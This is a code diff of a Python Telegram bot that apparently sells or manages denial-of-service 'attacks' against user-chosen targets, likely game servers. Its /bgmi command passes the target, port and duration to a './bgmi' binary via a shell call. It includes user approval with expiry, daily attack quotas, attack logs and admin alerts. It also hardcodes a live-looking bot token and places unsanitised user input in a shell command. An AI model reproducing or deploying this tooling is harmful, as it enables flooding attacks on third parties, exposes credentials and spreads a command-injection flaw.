@@ -3,174 +3,184 @@
 import telebot
 import subprocess
 import datetime
-import time
-import re
-import logging
+import os
+import threading
+from collections import defaultdict
 
-# ✅ Enable detailed logging
-logging.basicConfig(level=logging.INFO)
+# Insert your Telegram bot token here
+bot = telebot.TeleBot('6387049462:AAFreKcPrZpOggSrfi54Pqu0X3qE7nm7EuI')
 
-# ✅ Replace with your actual bot token from @BotFather
-BOT_TOKEN = '6387049462:AAFreKcPrZpOggSrfi54Pqu0X3qE7nm7EuI'
-bot = telebot.TeleBot(6387049462:AAFreKcPrZpOggSrfi54Pqu0X3qE7nm7EuI)
-
-# ✅ Admins
+# Admin user IDs
 admin_id = ["1383324178", "6060545769", "1871909759"]
 
-# ✅ Approved Users File
-APPROVED_USERS_FILE = "approved_users.txt"
-user_attacks = {}
-reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
+# File to store allowed user IDs
+USER_FILE = "users.txt"
+LOG_FILE = "log.txt"
+
+# Track user attack count
+user_attack_count = defaultdict(int)
+user_attack_timestamps = defaultdict(list)
 MAX_ATTACKS_PER_DAY = 20
 
-# ✅ Ensure correct bot token format
-if not BOT_TOKEN or len(BOT_TOKEN) < 45:
-    logging.error("⚠️ ERROR: Invalid Telegram Bot Token! Get a valid token from @BotFather.")
-    exit(1)
+# Track user approval times
+user_approval_expiry = {}
 
-def reset_attack_counts():
-    global reset_time, user_attacks
-    if datetime.datetime.now() >= reset_time:
-        user_attacks = {}
-        reset_time = datetime.datetime.now().replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
-
-def read_approved_users():
-    approved_users = {}
+# Function to read user IDs from the file
+def read_users():
     try:
-        with open(APPROVED_USERS_FILE, "r") as file:
-            for line in file:
-                parts = line.strip().split(",")
-                if len(parts) == 3:
-                    user_id, approval_time, expiry_time = parts
-                    approved_users[user_id] = expiry_time
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
     except FileNotFoundError:
-        pass
-    return approved_users
+        return []
 
-approved_users = read_approved_users()
+allowed_user_ids = read_users()
 
-def remove_expired_users():
+# Function to save users
+def save_users():
+    with open(USER_FILE, "w") as file:
+        for user in allowed_user_ids:
+            file.write(f"{user}\n")
+
+# Function to log attacks
+def log_command(user_id, target, port, time):
+    with open(LOG_FILE, "a") as file:
+        file.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Time: {time}\n")
+
+# Function to notify admins when an attack starts
+def notify_admins(user_id, target, port, time):
+    remaining_attacks = MAX_ATTACKS_PER_DAY - user_attack_count.get(user_id, 0)
+    for admin in admin_id:
+        bot.send_message(
+            admin,
+            f"🚨 **Attack Started** 🚨\n"
+            f"👤 User ID: {user_id}\n"
+            f"🎯 Target: {target}\n"
+            f"🔢 Port: {port}\n"
+            f"⏳ Duration: {time}s\n"
+            f"🔄 Remaining Attacks: {remaining_attacks}"
+        )
+
+# Reset attack count daily
+def reset_attack_counts():
+    global user_attack_count, user_attack_timestamps
     current_time = datetime.datetime.now()
-    expired_users = []
+    for user in list(user_attack_timestamps.keys()):
+        user_attack_timestamps[user] = [t for t in user_attack_timestamps[user] if (current_time - t).days < 1]
+        user_attack_count[user] = len(user_attack_timestamps[user])
 
-    for user_id, expiry_time in approved_users.items():
-        expiry_date = datetime.datetime.strptime(expiry_time, "%Y-%m-%d %H:%M:%S")
-        if current_time >= expiry_date:
-            expired_users.append(user_id)
+# Handler for /bgmi command (Start Attack)
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
 
-    for user_id in expired_users:
-        del approved_users[user_id]
+    # Reset daily attack counts if needed
+    reset_attack_counts()
 
-    with open(APPROVED_USERS_FILE, "w") as file:
-        for uid, expiry_time in approved_users.items():
-            file.write(f"{uid},{expiry_time}\n")
+    if user_id in allowed_user_ids:
+        if user_attack_count[user_id] >= MAX_ATTACKS_PER_DAY:
+            bot.reply_to(message, "❌ You have reached your daily limit of 20 attacks. Try again tomorrow!")
+            return
 
-def parse_duration(duration_str):
-    days, hours = 0, 0
-    day_match = re.search(r'(\d+)d', duration_str)
-    hour_match = re.search(r'(\d+)h', duration_str)
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
 
-    if day_match:
-        days = int(day_match.group(1))
-    if hour_match:
-        hours = int(hour_match.group(1))
+            if time > 300:
+                bot.reply_to(message, "Error: Maximum allowed attack time is 300 seconds.")
+                return
 
-    return days, hours
+            log_command(user_id, target, port, time)
+            user_attack_count[user_id] += 1
+            user_attack_timestamps[user_id].append(datetime.datetime.now())
 
+            notify_admins(user_id, target, port, time)
+
+            bot.reply_to(message, f"🔥 **Attack Started!**\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {time}s")
+
+            full_command = f"./bgmi {target} {port} {time}"
+            subprocess.run(full_command, shell=True)
+
+            bot.send_message(user_id, f"✅ **Attack Finished!**\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {time}s")
+        else:
+            bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
+    else:
+        bot.reply_to(message, "🚫 Unauthorized Access! Contact an admin for approval.")
+
+# Approve users with expiration time
 @bot.message_handler(commands=['approve'])
 def approve_user(message):
     user_id = str(message.chat.id)
-
-    if user_id not in admin_id:
-        bot.reply_to(message, "🚫 Only Admins Can Approve Users!")
-        return
-
-    command_parts = message.text.split()
-    if len(command_parts) < 3:
-        bot.reply_to(message, "⚠️ Usage: /approve <user_id> <duration>\nExample: /approve 123456789 3d2h")
-        return
-
-    target_user_id = command_parts[1]
-    duration_str = command_parts[2]
-    days, hours = parse_duration(duration_str)
-
-    if days == 0 and hours == 0:
-        bot.reply_to(message, "⚠️ Invalid duration format! Use 'd' for days and 'h' for hours. Example: 2d5h")
-        return
-
-    approval_time = datetime.datetime.now()
-    expiry_time = approval_time + datetime.timedelta(days=days, hours=hours)
-    expiry_time_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
-
-    approved_users[target_user_id] = expiry_time_str
-
-    with open(APPROVED_USERS_FILE, "a") as file:
-        file.write(f"{target_user_id},{expiry_time_str}\n")
-
-    response = f"✅ User {target_user_id} approved!\n⏳ Duration: {days} days, {hours} hours\n📅 Expires on: {expiry_time_str}"
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['mytime'])
-def check_remaining_time(message):
-    user_id = str(message.chat.id)
-
-    if user_id not in approved_users:
-        bot.reply_to(message, "🚫 You are not approved or your approval has expired.")
-        return
-
-    expiry_time = datetime.datetime.strptime(approved_users[user_id], "%Y-%m-%d %H:%M:%S")
-    remaining_time = expiry_time - datetime.datetime.now()
-
-    if remaining_time.total_seconds() <= 0:
-        del approved_users[user_id]
-        bot.reply_to(message, "🚫 Your approval has expired.")
-    else:
-        days, hours = divmod(remaining_time.total_seconds(), 86400)
-        hours, minutes = divmod(hours, 3600)
-        bot.reply_to(message, f"⏳ You have {int(days)} days, {int(hours)} hours, and {int(minutes)} minutes left.")
-
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    reset_attack_counts()
-    remove_expired_users()
-    user_id = str(message.chat.id)
-
-    if user_id not in approved_users:
-        bot.reply_to(message, "🚫 You are not approved for attacks.")
-        return
-
-    if user_attacks.get(user_id, 0) >= MAX_ATTACKS_PER_DAY:
-        bot.reply_to(message, "🚫 You have reached your daily limit of 20 attacks.")
-        return
-
-    command = message.text.split()
-    if len(command) == 4:
-        target, port, duration = command[1], int(command[2]), int(command[3])
-
-        if duration > 300:
-            bot.reply_to(message, "Error: Time must be less than 300 seconds.")
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) != 3:
+            bot.reply_to(message, "✅ Usage: /approve <user_id> <duration><h/d> (e.g., 1h, 3d)")
             return
 
-        user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
-        remaining_attacks = MAX_ATTACKS_PER_DAY - user_attacks[user_id]
+        target_user = command[1]
+        duration = command[2]
 
-        bot.reply_to(message, f"🔥 Attack Started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {duration} seconds")
+        # Extract time and unit
+        time_unit = duration[-1]
+        if time_unit not in ['h', 'd']:
+            bot.reply_to(message, "❌ Invalid time format! Use 'h' for hours or 'd' for days.")
+            return
 
-        for admin in admin_id:
-            bot.send_message(admin, f"🚨 **Attack Alert** 🚨\n👤 **User ID:** {user_id}\n🎯 **Target:** {target}\n🔢 **Port:** {port}\n⏳ **Duration:** {duration} seconds\n🔥 **Remaining Attacks:** {remaining_attacks}/20")
+        try:
+            time_value = int(duration[:-1])
+            if time_value <= 0:
+                raise ValueError
+        except ValueError:
+            bot.reply_to(message, "❌ Invalid time duration! Use a positive number.")
+            return
 
-        subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
-        time.sleep(duration)
-        bot.send_message(user_id, f"✅ Attack Finished!\n🎯 Target: {target}")
+        expiry_time = datetime.datetime.now()
+        if time_unit == 'h':
+            expiry_time += datetime.timedelta(hours=time_value)
+        elif time_unit == 'd':
+            expiry_time += datetime.timedelta(days=time_value)
 
+        user_approval_expiry[target_user] = expiry_time
+        allowed_user_ids.append(target_user)
+        save_users()
+
+        bot.reply_to(message, f"✅ **User {target_user} approved!**\n🕒 Expires at: {expiry_time}")
+
+        # Schedule removal
+        threading.Thread(target=schedule_removal, args=(target_user, expiry_time)).start()
     else:
-        bot.reply_to(message, "✅ Usage: /bgmi <target> <port> <time>")
+        bot.reply_to(message, "🚫 Only admins can use this command.")
 
-# ✅ Auto-restart on failure
+# Schedule user removal
+def schedule_removal(user_id, expiry_time):
+    while datetime.datetime.now() < expiry_time:
+        pass
+    if user_id in allowed_user_ids:
+        allowed_user_ids.remove(user_id)
+        save_users()
+        bot.send_message(user_id, "⚠️ Your approval has expired. Contact an admin for re-approval.")
+
+# Command to check approval status
+@bot.message_handler(commands=['check_approval'])
+def check_approval(message):
+    user_id = str(message.chat.id)
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "✅ Usage: /check_approval <user_id>")
+        return
+
+    target_user = command[1]
+    expiry_time = user_approval_expiry.get(target_user, None)
+
+    if expiry_time:
+        bot.reply_to(message, f"🕒 **User {target_user} is approved until {expiry_time}.**")
+    else:
+        bot.reply_to(message, f"❌ **User {target_user} is not approved.**")
+
+# Start bot polling
 while True:
     try:
-        logging.info("🚀 Bot Started Successfully!")
-        bot.polling(none_stop=True, interval=1, timeout=30)
+        bot.polling(none_stop=True)
     except Exception as e:
-        logging.error(f"⚠️ Telegram API Error: {e}")
-        time.sleep(5)  # Prevents infinite crashes
+        print(e)
